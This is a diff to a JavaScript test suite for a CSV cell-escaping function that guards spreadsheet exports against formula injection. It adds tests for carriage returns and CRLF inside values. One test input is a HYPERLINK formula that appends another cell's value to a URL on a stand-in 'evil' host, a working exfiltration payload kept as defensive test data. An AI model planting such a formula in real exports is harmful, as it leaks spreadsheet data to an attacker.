@@ -8,9 +8,12 @@ describe("escape_cell", () => {
     ["-1", "'-1"],
     ["@SUM(A1)", "'@SUM(A1)"],
     ["\tfoo", "'\tfoo"],
-    ["\rfoo", "'\rfoo"],
   ])("neutralises a leading formula character in %j", (input, expected) => {
     expect(escape_cell(input)).toBe(expected);
+  });
+
+  test("prefixes a leading CR, then quotes the field", () => {
+    expect(escape_cell("\rfoo")).toBe(`"'\rfoo"`);
   });
 
   test("prefixes before quoting, so the quote lands inside the field", () => {
@@ -33,6 +36,17 @@ describe("escape_cell", () => {
     expect(escape_cell("a,b")).toBe('"a,b"');
     expect(escape_cell('say "hi"')).toBe('"say ""hi"""');
     expect(escape_cell("a\nb")).toBe('"a\nb"');
+  });
+
+  test("quotes an inner CR, so a formula after it stays inside the field", () => {
+    expect(escape_cell('Ann\r=HYPERLINK("https://evil/?"&A2,"Refund")')).toBe(
+      `"Ann\r=HYPERLINK(""https://evil/?""&A2,""Refund"")"`
+    );
+    expect(escape_cell("Ann\r=1+1")).toBe('"Ann\r=1+1"');
+  });
+
+  test("quotes a CRLF inside a value", () => {
+    expect(escape_cell("line one\r\nline two")).toBe('"line one\r\nline two"');
   });
 
   test("renders null and undefined as empty", () => {
